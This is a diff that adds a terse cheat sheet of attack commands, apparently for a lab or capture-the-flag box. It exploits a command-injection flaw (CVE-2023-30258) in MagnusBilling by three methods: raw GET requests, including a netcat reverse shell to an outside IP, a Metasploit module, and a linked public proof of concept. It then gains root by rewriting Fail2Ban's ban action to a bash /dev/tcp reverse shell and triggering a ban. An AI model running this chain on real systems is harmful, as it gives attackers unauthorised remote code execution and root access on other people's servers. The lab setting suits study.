@@ -1,0 +1,38 @@
+# ==========================
+# Method 1 – Direct Exploit
+# ==========================
+# Trigger command injection
+GET /mbilling/lib/icepay/icepay.php?democ=/dev/null;sleep%205;
+
+# Spawn reverse shell (adjust IP/port as needed)
+GET /mbilling/lib/icepay/icepay.php?democ=/dev/null;nc%20-e%20/bin/bash%2010.0.4.61%2020444;%205;
+
+# ==========================
+# Method 2 – Metasploit
+# ==========================
+msfdb run
+
+use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
+setg RHOSTS 10.10.150.31
+set LHOST tun0
+run
+
+# ==========================
+# Method 3 – Public Exploit PoC
+# ==========================
+# Exploit script (Python PoC)
+https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit
+
+# ==========================
+# Privilege Escalation – Fail2Ban Abuse
+# ==========================
+# Read jail.conf for confirmation of sshd actionban rule
+cat /etc/fail2ban/jail.conf | grep -A 10 sshd
+
+# Replace actionban with reverse shell payload
+sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/10.9.0.211/4445 0>&1'"
+
+# Start listener: nc -lvnp 4445
+
+# Trigger ban → executes payload as root
+sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
